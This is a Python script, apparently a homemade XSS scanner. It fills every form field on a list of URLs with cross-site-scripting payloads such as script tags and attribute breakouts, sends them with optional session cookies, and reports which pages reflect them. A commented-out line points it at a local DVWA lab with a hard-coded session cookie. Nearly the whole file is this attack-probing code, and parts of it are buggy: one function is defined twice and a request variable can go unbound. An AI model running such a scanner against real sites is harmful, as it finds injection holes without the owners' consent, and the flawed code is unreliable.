import requests
from bs4 import BeautifulSoup
import mechanize
from form_urls import *
from form_input import *
import chk


def make_req(data,payloa):
 d={}
 for i in data:
  d[i]=payloa
 return d

def normalGetResponse(url,data,cookie):
 d=make_req(data,'helloIamGoodThnkYou')
 if cookie:
  try:
   request=requests.get(url+'12);alert(1234);//992',d,cookies=cookie)
  except:
   pass
  if XSS(request,d,12,'12);alert(1234);//992'):
    pass
 else:
  try:
   request=requests.get(url+'12);alert(1234);//992',d)
  except:
   pass
  if XSS(request,d,12,'12);alert(1234);//992'):
    pass
 return len(request.text),request.status_code

def normalPostResponse(url,data,cookie):
 d=make_req(data,'helloIamGood')
 if cookie:
  request=requests.post(url+'12);alert(1234);//992',d,cookies=cookie)
  if XSS(request,d,12,'12);alert(1234);//992'):
    pass
 else:
  request=requests.post(url+'12);alert(1234);//992',d)
  if XSS(request,d,12,'12);alert(1234);//992'):
    pass
 return len(request.text),request.status_code

def XSS(req,d,length,pay):
 flag=False
 if (pay in req.text or "alert(1234)" in req.text)  and bool(d):
  print("XSS found on the url: "+req.url)
  print("payload:"+str(d))
  print()
  flag=True
 return flag

def xsss():
 payload=['“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//','<script>alert()</script>','javascript://\'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*','/</title/\'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*','12);alert(1234);//992']
 error=['']
 list_of_urls=iterate_through_file('demofile.txt')

 for i in list_of_urls:
  input_req=return_input(i,'')
  for k in range(0,len(input_req),3):
   if input_req[k+1]=='post' or input_req[k+1]=='POST':
    #length,status_code=normalPostResponse(input_req[k],input_req[k+2])
    length=0
    for pay in payload:
     
     d=make_req(input_req[k+2],pay)
    #print(input_req[k],d)
     request=requests.post(input_req[k],d)
     if XSS(request,d,length,pay):
      break
   elif input_req[k+1]=='get' or input_req[k+1]=='GET':
    #length,status_code=normalGetResponse(input_req[k],input_req[k+2])
    length=0
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.get(input_req[k],d)
     if XSS(request,d,length,pay):
      break

def xsssC(cookie):
 payload=['“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//','<script>alert()</script>','javascript://\'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*','/</title/\'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*']
 error=['']
 list_of_urls=iterate_through_file('demofile.txt')

 for i in list_of_urls:
  input_req=return_input(i,cookie)
  for k in range(0,len(input_req),3):
   if input_req[k+1]=='post' or input_req[k+1]=='POST':
    length,status_code=normalPostResponse(input_req[k],input_req[k+2],cookie)
    for pay in payload:
     d=make_req(input_req[k+2],pay)
    #print(input_req[k],d)
     request=requests.post(input_req[k],d,cookies=cookie)
     if XSS(request,d,length,pay):
      break
   elif input_req[k+1]=='get' or input_req[k+1]=='GET':
    length,status_code=normalGetResponse(input_req[k],input_req[k+2],cookie)
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.get(input_req[k],d,cookies=cookie)
     if XSS(request,d,length,pay):
      break        
#xsss()
def xsssC(url,cookie):
 payload=['“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//','<script>alert()</script>','javascript://\'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*','/</title/\'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*']
 error=['']
 #list_of_urls=iterate_through_file('demofile.txt')

 #for i in list_of_urls:
 input_req=return_input(url,cookie)
 #print(input_req)
 for k in range(0,len(input_req),3):
  if input_req[k+1]=='post' or input_req[k+1]=='POST':
   length,status_code=normalPostResponse(input_req[k],input_req[k+2],cookie)
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    #print(input_req[k],d)
    request=requests.post(input_req[k],d,cookies=cookie)
    if XSS(request,d,length,pay):
     break
  elif input_req[k+1]=='get' or input_req[k+1]=='GET':
   length,status_code=normalGetResponse(input_req[k],input_req[k+2],cookie)
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    request=requests.get(input_req[k],d,cookies=cookie)
    if XSS(request,d,length,pay):
     break   

#xsssC("http://localhost/DVWA/vulnerabilities/xss_s/",chk.getCookie("security=low; security_level=0; PHPSESSID=7vchipu70lrkvo2abd3297jva4"))